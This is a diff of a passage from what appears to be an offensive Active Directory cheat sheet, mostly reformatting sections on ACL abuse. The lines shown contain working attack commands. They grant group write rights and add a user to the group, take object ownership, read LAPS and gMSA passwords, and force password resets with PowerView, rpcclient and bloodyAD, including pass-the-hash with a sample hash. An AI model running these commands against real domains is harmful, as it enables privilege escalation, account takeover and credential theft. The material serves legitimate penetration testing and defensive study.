@@ -133,12 +133,9 @@ To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privi
   
 * WriteDACL on Group
   ```powershell
-  Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
+  PowerSploit> Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
   net group "INTERESTING_GROUP" User1 /add /domain
-  ```
-  Or  
-  ```powershell
-  bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
+  bloodyAD> bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp
   
   # Remove right
   bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False
@@ -151,7 +148,9 @@ An attacker can update the owner of the target object. Once the object owner has
 ```powershell
 Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
 ```
-Or  
+
+Using BloodyAD
+
 ```powershell
 bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object
 ```
@@ -166,7 +165,9 @@ An attacker can read the LAPS password of the computer account this ACE applies 
 ```powershell
 Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
 ```
+
 Or for a given computer  
+
 ```powershell
 bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
 ```
@@ -184,7 +185,9 @@ $mp = $gmsa.'msDS-ManagedPassword'
 # Decode the data structure using the DSInternals module
 ConvertFrom-ADManagedPasswordBlob $mp
 ```
-Or  
+
+Using BloodyAD
+
 ```powershell
 python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
 ```
@@ -192,20 +195,21 @@ python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getO
 ## ForceChangePassword
 
 An attacker can change the password of the user this ACE applies to:
-* On Windows, this can be achieved with `Set-DomainUserPassword` (PowerView module):
-```powershell
-$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
-```
 
-* On Linux:
-```bash
-# Using rpcclient from the  Samba software suite
-rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
+* Windows:
+	```powershell
+	$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+	Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
+	```
 
-# Using bloodyAD with pass-the-hash
-bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
-```
+* Linux:
+	```bash
+	# Using rpcclient from the  Samba software suite
+	rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
+
+	# Using bloodyAD with pass-the-hash
+	bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
+	```
 
 
 ## References
